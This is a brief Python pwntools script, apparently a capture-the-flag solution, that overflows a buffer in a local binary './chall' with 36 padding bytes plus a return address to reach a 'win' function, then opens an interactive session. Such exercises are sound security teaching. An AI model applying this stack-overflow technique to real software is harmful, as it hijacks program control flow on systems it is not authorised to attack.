from pwn import *

ret2win = 0x08049220

payload = b"A" * 36 + p32(ret2win)

p = process("./chall")

p.send(payload)
p.sendline()
p.interactive()
